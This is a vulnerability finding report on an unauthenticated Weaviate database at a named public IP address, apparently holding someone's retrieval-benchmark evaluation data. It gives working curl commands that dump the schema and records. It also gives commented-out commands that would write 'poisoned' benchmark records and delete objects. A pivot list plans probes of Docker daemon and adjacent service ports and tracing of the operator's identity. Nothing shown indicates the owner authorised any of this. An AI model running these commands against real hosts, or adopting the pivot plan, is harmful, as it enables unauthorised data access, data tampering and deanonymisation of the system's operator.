# ColPali Researcher -- Unauth RWD on Multimodal Retrieval Benchmark Corpus (Weaviate)

**Date:** 2026-06-20
**Tool:** weavscan
**Severity:** HIGH
**Status:** CONFIRMED -- unauth read (write + delete not exercised; no auth layer present)

---

## Target

| Field | Value |
|-------|-------|
| IP | 103.219.171.197 |
| Domain | None identified |
| Port | 8080 |
| Service | Weaviate 1.36.8 |
| Hosting | Asia-Pacific cloud (likely) |
| Node ID | ae5952d0dff9 |
| Auth | NONE |

---

## Operator Attribution

**AI retrieval researcher** -- identity not confirmed; operator is actively evaluating multimodal document retrieval models against published benchmarks.

| Signal | Inference |
|--------|-----------|
| Class names reference ColPali | Operator is evaluating the ColPali visual document retrieval model (Faysse et al., 2024) |
| ViDoRe class names | Operator is running evaluations against the ViDoRe (Visual Document Retrieval) benchmark |
| NanoBEIR / ColBERT classes | Also evaluating dense retrieval baselines (ColBERT v2, BEIR benchmarks) |
| EF/R/K params in class names | Each class encodes a distinct hyperparameter configuration (ef=HNSW ef_search, R=recall@K, K=top-K) |
| 8 ColPali eval variant classes | Active parameter sweep underway; not a historical archive |
| 64,099 total objects | Active research environment, not abandoned infrastructure |

No commercial PII. Operator is a researcher, likely academic or ML engineering background.

---

## Data

**11 classes, ~64,099 total objects.**

| Class | Props | Content |
|-------|-------|---------|
| NanoBEIRColBERTMinimal | corpusid, dataset | NanoBEIR benchmark corpus, ColBERT model evaluation |
| LIMITcolbertv2 | corpusid, text | ColBERT v2 dense retrieval evaluation |
| ColpaliEvalEf100R20K5P8edc696c39a | corpusid, dataset | ColPali eval run (ef=100, recall@20K, params variant A) |
| ColpaliEvalR20K5P164cb50c8e31 | corpusid, dataset | ColPali eval variant B |
| ColpaliEvalEf100R20K5P8fc4e466e15 | corpusid, dataset | ColPali eval variant C |
| ColpaliEvalEf100R20K3P893f3c5aa48 | corpusid, dataset | ColPali eval variant D (K=3) |
| ColpaliEvalEf100R20K5P80154d84d81 | corpusid, dataset | ColPali eval variant E |
| ColpaliEvalEf100R20K3P859712b8e30 | corpusid, dataset | ColPali eval variant F (K=3) |
| ViDoReColPaliGoMuveraMinimal | corpusid, dataset | ViDoRe benchmark, GoMuvera model baseline |
| ViDoReColPaliMinimal | corpusid, dataset | ViDoRe benchmark, ColPali baseline |
| ColpaliEvalEf100R20K5P166d49dbf84c | corpusid, dataset | ColPali eval variant G |

**Class naming schema:**
```
ColpaliEval Ef{ef_search} R{recall_at} K{param_count} P{precision_k} {run_hash}
```

Each class is an isolated evaluation run. Hash suffix encodes run identity. Eight concurrent variants indicate an active sweep over ef_search and precision@K parameters.

**Benchmark datasets likely indexed:** ViDoRe (DocVQA, InfoVQA, ArxivQA, TabFQuAD, TatDQA), NanoBEIR. corpusid fields in each record would confirm which sub-benchmarks are present.

---

## Access Matrix

| Operation | Result | HTTP |
|-----------|--------|------|
| GET /v1/meta | 200 + version + node ID ae5952d0dff9 | 200 |
| GET /v1/schema | 200 + all 11 class schemas | 200 |
| POST /v1/graphql (NanoBEIRColBERTMinimal) | 200 + records | 200 |
| POST /v1/graphql (ColpaliEval* classes) | 200 + records | 200 |
| POST /v1/graphql (ViDoRe* classes) | 200 + records | 200 |
| POST /v1/objects | Not exercised | -- |
| DELETE /v1/objects/{uuid} | Not exercised | -- |

---

## PoC

**Read -- version and node identity:**
```bash
curl -s http://103.219.171.197:8080/v1/meta | jq '{version:.version, hostname:.hostname}'
```

**Read -- enumerate all evaluation runs:**
```bash
curl -s http://103.219.171.197:8080/v1/schema \
  | jq '[.classes[].class]'
```

**Read -- pull ColPali eval corpus records:**
```bash
curl -s -X POST http://103.219.171.197:8080/v1/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{Get{ColpaliEvalEf100R20K5P8edc696c39a(limit:10){corpusid dataset}}}"}' \
  | jq '.data.Get.ColpaliEvalEf100R20K5P8edc696c39a[]'
```

**Read -- pull ViDoRe baseline:**
```bash
curl -s -X POST http://103.219.171.197:8080/v1/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{Get{ViDoReColPaliMinimal(limit:10){corpusid dataset}}}"}' \
  | jq '.data.Get.ViDoReColPaliMinimal[]'
```

**Write -- inject poisoned benchmark record (not exercised; structural):**
```bash
# Not executed. No auth layer at POST /v1/objects.
# curl -s -X POST http://103.219.171.197:8080/v1/objects \
#   -H 'Content-Type: application/json' \
#   -d '{"class":"ViDoReColPaliMinimal","properties":{"corpusid":"CANARY-weavscan","dataset":"poisoned"}}'
```

**Delete (not exercised):**
```bash
# Not executed.
# curl -s -X DELETE http://103.219.171.197:8080/v1/objects/ViDoReColPaliMinimal/{uuid}
```

---

## Impact

### Research IP Exposure
Full hyperparameter sweep configuration is readable: ef_search values, recall@K targets, precision@K configurations, and run-specific hashes are encoded in class names and readable via schema. Competitor or adversarial actor can extract the operator's experimental design before publication.

### Benchmark Corpus Exfiltration
64,099 indexed objects span ViDoRe and NanoBEIR benchmark corpora. If custom annotation or scoring data is embedded in the dataset field, that is extractable proprietary evaluation data.

### Academic Integrity -- Benchmark Poisoning
No write authentication means an actor can inject false corpus records into any of the 11 evaluation classes. Poisoned records corrupt recall and precision metrics for the affected evaluation run. If the operator is computing benchmark scores against this corpus, injected records produce falsified results. Published results based on a poisoned corpus constitute fabricated research data.

### Node ID Fingerprint
Node ID ae5952d0dff9 matches Docker short-ID format (12-char hex). If the Docker daemon is exposed on the host, this fingerprint enables container enumeration and potential escape surface.

---

## Pivot Avenues

1. **corpusid field scroll across all 11 classes** -- enumerate unique corpus IDs to confirm which ViDoRe sub-benchmarks are indexed (DocVQA, InfoVQA, ArxivQA, TabFQuAD). Sub-benchmark identity narrows operator to a specific research group.
2. **Class run-hash correlation** -- each hash (edc696c39a, 64cb50c8e31, etc.) likely corresponds to a logged evaluation run; if operator has a public GitHub or arXiv paper referencing these hashes, identity is confirmed.
3. **ae5952d0dff9 Docker node ID** -- probe 103.219.171.197:2375 and :2376 for exposed Docker daemon; this node ID is a direct container fingerprint.
4. **Adjacent ports on 103.219.171.197** -- scan for Jupyter (8888), MLflow (5000), or model serving endpoints (8000, 8001) that may be co-deployed in the same research stack.
5. **GoMuvera class presence** -- GoMuvera is a recent late-interaction retrieval model; operator is tracking cutting-edge multimodal retrieval. Narrows identity to a small community of active researchers in this space (check arXiv 2024-2025 ColPali/ViDoRe citation graph).

---

## Tool Reference

**weavscan** -- https://github.com/nuclide-research/weavscan

Unauthenticated Weaviate enumeration: schema walk, class object extraction, GraphQL query execution, RWD surface confirmation.
